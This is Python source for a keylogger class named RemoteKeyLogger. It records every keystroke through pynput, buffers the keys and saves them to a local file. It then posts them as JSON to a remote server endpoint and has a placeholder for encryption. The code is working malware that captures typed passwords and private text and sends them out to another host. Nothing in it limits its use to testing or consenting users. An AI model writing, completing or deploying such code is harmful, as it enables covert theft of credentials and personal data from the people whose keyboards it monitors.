from pynput import keyboard
import requests
import time
import threading
import json

class RemoteKeyLogger:
    def __init__(self, server_url, log_file="key_log.txt", buffer_size=10, encryption_key=None):
        self.server_url = server_url
        self.log_file = log_file
        self.buffer_size = buffer_size
        self.buffer = []
        self.encryption_key = encryption_key
        self.lock = threading.Lock()  # Ensure thread-safe buffer access
        self.start_logging()

    def start_logging(self):
        with open(self.log_file, "a") as f:
            f.write("\n\nNew Session Started: " + time.strftime('%Y-%m-%d %H:%M:%S') + "\n")

    def encrypt_data(self, data):
        # Placeholder for encryption logic, add actual encryption based on your encryption_key
        return data  # This should be the encrypted version of data

    def flush_buffer(self):
        with self.lock:
            log_data = "".join(self.buffer)
            self.buffer.clear()

        # Encrypt the log data before sending
        encrypted_data = self.encrypt_data(log_data)

        # Send the log data to the server in a non-blocking way
        threading.Thread(target=self.send_logs_to_server, args=(encrypted_data,)).start()

        # Also save locally as a backup
        with open(self.log_file, "a") as f:
            f.write(log_data)

    def send_logs_to_server(self, log_data):
        try:
            response = requests.post(self.server_url, data=json.dumps({"log": log_data}), headers={"Content-Type": "application/json"})
            if response.status_code == 200:
                print("Logs sent successfully")
            else:
                print(f"Failed to send logs, status code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error sending logs: {e}")

    def on_release(self, key):
        try:
            key_str = key.char if key.char else str(key)
        except AttributeError:
            key_str = str(key)

        special_keys = {
            "Key.space": " ",
            "Key.enter": "\n",
            "Key.backspace": "[BACKSPACE]",
            "Key.ctrl_l": "[CTRL]",
            "Key.ctrl_r": "[CTRL]",
            "Key.shift": "[SHIFT]",
            "Key.shift_r": "[SHIFT]",
            "Key.esc": "[ESC]",
            "Key.tab": "[TAB]",
            "Key.caps_lock": "[CAPSLOCK]",
            "Key.up": "[UP]",
            "Key.down": "[DOWN]",
            "Key.left": "[LEFT]",
            "Key.right": "[RIGHT]",
            "Key.f1": "[F1]",
            "Key.f2": "[F2]",
        }

        key_str = special_keys.get(key_str, key_str)

        if key == keyboard.Key.esc:
            self.flush_buffer()
            return False

        self.buffer.append(key_str)

        if len(self.buffer) >= self.buffer_size:
            self.flush_buffer()

    def run(self):
        with keyboard.Listener(on_release=self.on_release) as listener:
            listener.join()
        if self.buffer:
            self.flush_buffer()

if __name__ == "__main__":
    server_url = "https://example.com/log_receiver"  # Use a proper HTTPS endpoint
    logger = RemoteKeyLogger(server_url=server_url, buffer_size=50)
    logger.run()
